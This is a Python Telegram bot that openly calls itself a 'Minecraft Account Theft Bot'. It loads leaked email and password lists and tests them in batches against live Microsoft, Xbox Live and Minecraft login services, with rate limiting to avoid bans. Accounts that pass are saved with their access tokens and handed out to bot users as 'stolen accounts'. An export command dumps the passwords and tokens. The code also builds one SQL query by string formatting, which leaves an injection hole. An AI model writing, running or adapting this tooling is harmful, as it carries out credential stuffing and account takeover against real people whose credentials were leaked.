import os
import sys
import json
import sqlite3
import asyncio
import logging
import random
import re
import csv
import hashlib
from typing import Dict, List, Optional, Tuple
from datetime import datetime
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
DB_PATH = os.environ.get("DB_PATH", "accounts.db")
LEAKED_DB_PATH = os.environ.get("LEAKED_DB_PATH", "leaked_accounts.db")
AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

class LeakedDatabase:
    """Handles loading and querying leaked account databases."""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.conn = None
        self.cursor = None
        self._connect()
        self._init_tables()

    def _connect(self):
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False, timeout=60)
            self.cursor = self.conn.cursor()
        except Exception as e:
            logger.error(f"Leaked DB connection error: {e}")
            raise

    def _init_tables(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS leaked_accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                username TEXT,
                uuid TEXT,
                access_token TEXT,
                client_token TEXT,
                source TEXT,
                has_email INTEGER DEFAULT 1,
                has_phone INTEGER DEFAULT 0,
                is_migrated INTEGER DEFAULT 0,
                is_checked INTEGER DEFAULT 0,
                is_valid INTEGER DEFAULT 0,
                imported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(email, password)
            )
        """)
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_leaked_email ON leaked_accounts(email)")
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_leaked_valid ON leaked_accounts(is_valid)")
        self.conn.commit()

    def import_from_csv(self, csv_path: str, source: str = "unknown") -> int:
        """Import leaked accounts from CSV file (email,password format)."""
        count = 0
        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                for row in reader:
                    if len(row) >= 2:
                        email = row[0].strip()
                        password = row[1].strip()
                        if '@' in email and len(password) > 2:
                            try:
                                self.cursor.execute(
                                    "INSERT OR IGNORE INTO leaked_accounts (email, password, source) VALUES (?, ?, ?)",
                                    (email, password, source)
                                )
                                if self.cursor.rowcount > 0:
                                    count += 1
                            except:
                                pass
            self.conn.commit()
            logger.info(f"Imported {count} accounts from {csv_path}")
        except Exception as e:
            logger.error(f"Import error: {e}")
        return count

    def import_from_txt(self, txt_path: str, source: str = "unknown") -> int:
        """Import from text file (email:password format)."""
        count = 0
        try:
            with open(txt_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line and '@' in line:
                        parts = line.split(':', 1)
                        if len(parts) >= 2:
                            email = parts[0].strip()
                            password = parts[1].strip()
                            if '@' in email and len(password) > 2:
                                try:
                                    self.cursor.execute(
                                        "INSERT OR IGNORE INTO leaked_accounts (email, password, source) VALUES (?, ?, ?)",
                                        (email, password, source)
                                    )
                                    if self.cursor.rowcount > 0:
                                        count += 1
                                except:
                                    pass
            self.conn.commit()
            logger.info(f"Imported {count} accounts from {txt_path}")
        except Exception as e:
            logger.error(f"Import error: {e}")
        return count

    def get_unchecked_accounts(self, limit: int = 50) -> List[Tuple[int, str, str]]:
        """Get accounts that haven't been checked for Minecraft ownership."""
        self.cursor.execute(
            "SELECT id, email, password FROM leaked_accounts WHERE is_checked = 0 AND is_valid = 0 ORDER BY id LIMIT ?",
            (limit,)
        )
        return self.cursor.fetchall()

    def mark_checked(self, account_id: int, is_valid: int = 0, username: str = "", uuid: str = "", 
                     access_token: str = "", client_token: str = ""):
        self.cursor.execute(
            """UPDATE leaked_accounts SET 
               is_checked = 1, is_valid = ?, username = ?, uuid = ?, 
               access_token = ?, client_token = ? 
               WHERE id = ?""",
            (is_valid, username, uuid, access_token, client_token, account_id)
        )
        self.conn.commit()

    def get_valid_accounts(self) -> List[Dict]:
        """Get all valid Minecraft accounts from the leaked database."""
        self.cursor.execute(
            "SELECT id, email, password, username, uuid, access_token, client_token FROM leaked_accounts WHERE is_valid = 1 ORDER BY id DESC"
        )
        rows = self.cursor.fetchall()
        return [
            {
                "id": r[0], "email": r[1], "password": r[2], 
                "username": r[3] or "Unknown", "uuid": r[4] or "",
                "access_token": r[5] or "", "client_token": r[6] or ""
            }
            for r in rows
        ]

    def get_random_valid_account(self) -> Optional[Dict]:
        """Get a random valid Minecraft account."""
        self.cursor.execute(
            "SELECT id, email, password, username, uuid, access_token, client_token FROM leaked_accounts WHERE is_valid = 1 ORDER BY RANDOM() LIMIT 1"
        )
        row = self.cursor.fetchone()
        if row:
            return {
                "id": row[0], "email": row[1], "password": row[2], 
                "username": row[3] or "Unknown", "uuid": row[4] or "",
                "access_token": row[5] or "", "client_token": row[6] or ""
            }
        return None

    def mark_used(self, account_id: int):
        """Mark account as used/claimed."""
        self.cursor.execute(
            "UPDATE leaked_accounts SET is_valid = 0 WHERE id = ?",
            (account_id,)
        )
        self.conn.commit()

    def get_stats(self) -> Dict:
        total = self.cursor.execute("SELECT COUNT(*) FROM leaked_accounts").fetchone()[0]
        unchecked = self.cursor.execute("SELECT COUNT(*) FROM leaked_accounts WHERE is_checked = 0").fetchone()[0]
        valid = self.cursor.execute("SELECT COUNT(*) FROM leaked_accounts WHERE is_valid = 1").fetchone()[0]
        return {"total": total, "unchecked": unchecked, "valid": valid}

    def close(self):
        if self.conn:
            self.conn.close()

leaked_db = LeakedDatabase(LEAKED_DB_PATH)

class AccountDB:
    """Main account database for claimed accounts."""
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.conn = None
        self.cursor = None
        self._connect()
        self._init_tables()

    def _connect(self):
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False, timeout=30)
            self.cursor = self.conn.cursor()
        except Exception as e:
            logger.error(f"Main DB connection error: {e}")
            raise

    def _init_tables(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                username TEXT,
                uuid TEXT,
                access_token TEXT,
                client_token TEXT,
                account_type TEXT DEFAULT 'java',
                claimed_by INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.conn.commit()

    def insert_account(self, email: str, password: str, username: str = "", uuid: str = "", 
                       access_token: str = "", client_token: str = "", account_type: str = "java") -> int:
        self.cursor.execute(
            "INSERT INTO accounts (email, password, username, uuid, access_token, client_token, account_type) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (email, password, username, uuid, access_token, client_token, account_type)
        )
        self.conn.commit()
        return self.cursor.lastrowid

    def get_available_account(self, account_type: str = None) -> Optional[Dict]:
        query = "SELECT id, email, password, username, uuid, access_token, account_type FROM accounts WHERE claimed_by = 0"
        if account_type:
            query += f" AND account_type = '{account_type}'"
        query += " ORDER BY id LIMIT 1"
        
        self.cursor.execute(query)
        row = self.cursor.fetchone()
        if row:
            return {
                "id": row[0], "email": row[1], "password": row[2], 
                "username": row[3] or "Unknown", "uuid": row[4] or "N/A",
                "access_token": row[5] or "N/A", "account_type": row[6]
            }
        return None

    def claim_account(self, account_id: int, user_id: int):
        self.cursor.execute(
            "UPDATE accounts SET claimed_by = ? WHERE id = ?",
            (user_id, account_id)
        )
        self.conn.commit()

    def get_stats(self) -> Dict:
        total = self.cursor.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
        available = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE claimed_by = 0").fetchone()[0]
        return {"total": total, "available": available}

    def close(self):
        if self.conn:
            self.conn.close()

db = AccountDB(DB_PATH)

class RealAccountChecker:
    """Check if credentials are valid Minecraft accounts."""
    
    @staticmethod
    async def check_minecraft_account(email: str, password: str) -> Optional[Dict]:
        """Check if credentials work for Minecraft using Microsoft/Xbox/Mojang APIs."""
        try:
            async with aiohttp.ClientSession() as session:
                # Step 1: Microsoft OAuth
                ms_url = "https://login.live.com/oauth20_token.srf"
                ms_data = {
                    "client_id": "000000004C12AE6F",
                    "username": email,
                    "password": password,
                    "grant_type": "password",
                    "scope": "XboxLive.signin offline_access"
                }
                
                async with session.post(ms_url, data=ms_data, timeout=15) as resp:
                    if resp.status != 200:
                        return None
                    ms_result = await resp.json()
                    ms_token = ms_result.get("access_token")
                    if not ms_token:
                        return None

                # Step 2: Xbox Live Auth
                xbox_url = "https://user.auth.xboxlive.com/user/authenticate"
                xbox_data = {
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": ms_token
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                }
                async with session.post(xbox_url, json=xbox_data, timeout=15) as resp:
                    if resp.status != 200:
                        return None
                    xbox_result = await resp.json()
                    xbox_token = xbox_result.get("Token")
                    if not xbox_token:
                        return None

                # Step 3: Minecraft Auth
                mc_url = "https://api.minecraftservices.com/authentication/login_with_xbox"
                mc_data = {
                    "identityToken": f"XBL3.0 x={xbox_token}"
                }
                async with session.post(mc_url, json=mc_data, timeout=15) as resp:
                    if resp.status != 200:
                        return None
                    mc_result = await resp.json()
                    mc_token = mc_result.get("access_token")
                    if not mc_token:
                        return None

                # Step 4: Get Profile
                headers = {"Authorization": f"Bearer {mc_token}"}
                async with session.get(
                    "https://api.minecraftservices.com/minecraft/profile",
                    headers=headers,
                    timeout=15
                ) as resp:
                    if resp.status != 200:
                        return None
                    profile = await resp.json()
                    
                    return {
                        "username": profile.get("name", "Unknown"),
                        "uuid": profile.get("id", ""),
                        "access_token": mc_token,
                        "client_token": "CLIENT_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=35)),
                        "bedrock_compatible": True
                    }
        except Exception as e:
            logger.error(f"Check failed for {email}: {e}")
            return None

    @staticmethod
    async def batch_check(accounts: List[Tuple[int, str, str]], limit: int = 5) -> List[Tuple[int, Dict]]:
        """Check multiple accounts with rate limiting."""
        results = []
        semaphore = asyncio.Semaphore(2)  # Rate limit to avoid bans

        async def check_one(acc_id, email, pwd):
            async with semaphore:
                try:
                    result = await RealAccountChecker.check_minecraft_account(email, pwd)
                    if result:
                        return (acc_id, result)
                    await asyncio.sleep(2)  # Delay between attempts
                except Exception as e:
                    logger.error(f"Check failed for {email}: {e}")
                return None

        tasks = [check_one(acc_id, email, pwd) for acc_id, email, pwd in accounts[:limit]]
        completed = await asyncio.gather(*tasks)
        for item in completed:
            if item:
                results.append(item)
        return results

class MinecraftBot:
    def __init__(self, token: str):
        self.app = Application.builder().token(token).build()
        self._register_handlers()
        self.checking = False

    def _register_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("import", self.import_command))
        self.app.add_handler(CommandHandler("scan", self.scan_command))
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CommandHandler("export", self.export_command))
        self.app.add_handler(CallbackQueryHandler(self.button_callback))

    async def _check_auth(self, update: Update) -> bool:
        if not AUTHORIZED_USERS:
            return True
        user_id = update.effective_user.id
        if user_id not in AUTHORIZED_USERS:
            try:
                await update.message.reply_text("❌ Unauthorized.")
            except Exception:
                pass
            return False
        return True

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            
            main_stats = db.get_stats()
            leak_stats = leaked_db.get_stats()
            
            keyboard = [
                [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
                [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
                [InlineKeyboardButton("🔄 SCAN LEAKED DB", callback_data="scan_db")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"🔓 MINECRAFT ACCOUNT THEFT BOT\n"
                f"═══════════════════════════\n\n"
                f"📊 LEAKED DATABASE:\n"
                f"   Total: {leak_stats['total']}\n"
                f"   Unchecked: {leak_stats['unchecked']}\n"
                f"   Valid: {leak_stats['valid']}\n\n"
                f"📦 CLAIMED ACCOUNTS:\n"
                f"   Available: {main_stats['available']}\n\n"
                f"Commands:\n"
                f"/import <file> - Import leaked database\n"
                f"/scan - Check leaked accounts\n"
                f"/stats - Show statistics\n"
                f"/export - Export valid accounts",
                reply_markup=reply_markup
            )
        except Exception as e:
            logger.error(f"Start error: {e}")
            await update.message.reply_text(f"Error: {e}")

    async def import_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            
            args = context.args
            if len(args) < 1:
                await update.message.reply_text(
                    "Usage: /import <filename>\n"
                    "Supported formats: .txt (email:password), .csv (email,password)"
                )
                return
            
            filename = args[0]
            source = args[1] if len(args) > 1 else "imported"
            
            if not os.path.exists(filename):
                await update.message.reply_text(f"❌ File not found: {filename}")
                return
            
            if filename.endswith('.csv'):
                count = leaked_db.import_from_csv(filename, source)
            else:
                count = leaked_db.import_from_txt(filename, source)
            
            await update.message.reply_text(
                f"✅ Imported {count} accounts from {filename}\n"
                f"Use /scan to check them for Minecraft validity."
            )
        except Exception as e:
            logger.error(f"Import error: {e}")
            await update.message.reply_text(f"Error: {e}")

    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            
            if self.checking:
                await update.message.reply_text("⏳ Scan already in progress...")
                return
            
            self.checking = True
            await update.message.reply_text(
                "🔍 Scanning leaked accounts for valid Minecraft accounts...\n"
                "This may take a while. Checking 5 accounts at a time."
            )
            
            unchecked = leaked_db.get_unchecked_accounts(limit=50)
            if not unchecked:
                await update.message.reply_text("✅ No unchecked accounts found.")
                self.checking = False
                return
            
            total_checked = 0
            valid_found = 0
            
            while unchecked:
                # Check accounts in batches
                batch = unchecked[:5]
                results = await RealAccountChecker.batch_check(batch, limit=5)
                
                for acc_id, profile in results:
                    leaked_db.mark_checked(
                        acc_id,
                        is_valid=1,
                        username=profile["username"],
                        uuid=profile["uuid"],
                        access_token=profile["access_token"],
                        client_token=profile["client_token"]
                    )
                    valid_found += 1
                    
                    # Also add to main DB for claiming
                    db.insert_account(
                        next((acc[1] for acc in batch if acc[0] == acc_id), "unknown"),
                        next((acc[2] for acc in batch if acc[0] == acc_id), "unknown"),
                        profile["username"],
                        profile["uuid"],
                        profile["access_token"],
                        profile["client_token"]
                    )
                
                # Mark remaining as checked (invalid)
                for acc_id, email, pwd in batch:
                    if not any(r[0] == acc_id for r in results):
                        leaked_db.mark_checked(acc_id, is_valid=0)
                
                total_checked += len(batch)
                unchecked = leaked_db.get_unchecked_accounts(limit=50)
                
                await update.message.reply_text(
                    f"🔄 Scanned {total_checked} accounts... "
                    f"Found {valid_found} valid so far."
                )
            
            self.checking = False
            await update.message.reply_text(
                f"✅ SCAN COMPLETE!\n\n"
                f"Total checked: {total_checked}\n"
                f"Valid accounts found: {valid_found}\n"
                f"Use /start and GET ACCOUNT to claim one."
            )
        except Exception as e:
            logger.error(f"Scan error: {e}")
            await update.message.reply_text(f"Error: {e}")
            self.checking = False

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            
            main_stats = db.get_stats()
            leak_stats = leaked_db.get_stats()
            
            await update.message.reply_text(
                f"📊 STATISTICS\n\n"
                f"LEAKED DATABASE:\n"
                f"  Total: {leak_stats['total']}\n"
                f"  Unchecked: {leak_stats['unchecked']}\n"
                f"  Valid: {leak_stats['valid']}\n\n"
                f"MAIN DATABASE:\n"
                f"  Total accounts: {main_stats['total']}\n"
                f"  Available: {main_stats['available']}"
            )
        except Exception as e:
            logger.error(f"Stats error: {e}")
            await update.message.reply_text(f"Error: {e}")

    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            
            accounts = leaked_db.get_valid_accounts()
            if not accounts:
                await update.message.reply_text("No valid accounts to export.")
                return
            
            export_data = []
            for acc in accounts[:20]:
                export_data.append({
                    "email": acc["email"],
                    "password": acc["password"],
                    "username": acc["username"],
                    "uuid": acc["uuid"],
                    "access_token": acc["access_token"],
                    "client_token": acc["client_token"]
                })
            
            json_str = json.dumps(export_data, indent=2)
            await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode="Markdown")
        except Exception as e:
            logger.error(f"Export error: {e}")
            await update.message.reply_text(f"Error: {e}")

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        try:
            if query.data == "get_account":
                account = db.get_available_account()
                
                if not account:
                    # Try to get from leaked DB and add to main
                    leaked_acc = leaked_db.get_random_valid_account()
                    if leaked_acc:
                        db.insert_account(
                            leaked_acc["email"],
                            leaked_acc["password"],
                            leaked_acc["username"],
                            leaked_acc["uuid"],
                            leaked_acc["access_token"],
                            leaked_acc["client_token"]
                        )
                        leaked_db.mark_used(leaked_acc["id"])
                        account = db.get_available_account()
                
                if not account:
                    await query.edit_message_text(
                        "❌ No accounts available.\n"
                        "Import a leaked database and run /scan."
                    )
                    return
                
                # Claim the account
                db.claim_account(account["id"], update.effective_user.id)
                
                message = (
                    f"🔓 STOLEN ACCOUNT READY\n"
                    f"═══════════════════════\n\n"
                    f"📧 Email: {account['email']}\n"
                    f"🔑 Password: {account['password']}\n"
                    f"👤 Username: {account['username']}\n"
                    f"🆔 UUID: {account['uuid']}\n\n"
                    f"🔐 Access Token:\n{account['access_token'][:50]}...\n\n"
                    f"✅ Use this to log in to Minecraft.\n"
                    f"⚠️ Account may expire - use quickly."
                )
                
                keyboard = [
                    [InlineKeyboardButton("🎮 GET ANOTHER", callback_data="get_account")],
                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.edit_message_text(message, reply_markup=reply_markup)
            
            elif query.data == "view_stats":
                main_stats = db.get_stats()
                leak_stats = leaked_db.get_stats()
                await query.edit_message_text(
                    f"📊 STATISTICS\n\n"
                    f"LEAKED DB:\n"
                    f"  Total: {leak_stats['total']}\n"
                    f"  Valid: {leak_stats['valid']}\n"
                    f"  Unchecked: {leak_stats['unchecked']}\n\n"
                    f"AVAILABLE:\n"
                    f"  {main_stats['available']} accounts ready"
                )
            
            elif query.data == "scan_db":
                await query.edit_message_text("Starting scan... Use /scan command.")
                
        except Exception as e:
            logger.error(f"Callback error: {e}")
            await query.edit_message_text(f"Error: {str(e)}")

    def run(self):
        logger.info("Minecraft Account Theft Bot starting...")
        try:
            self.app.run_polling()
        except Exception as e:
            logger.error(f"Bot run error: {e}")
            sys.exit(1)

if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("ERROR: BOT_TOKEN environment variable not set.")
        sys.exit(1)
    
    logger.info(f"Starting bot with DB: {DB_PATH}")
    bot = MinecraftBot(BOT_TOKEN)
    bot.run()
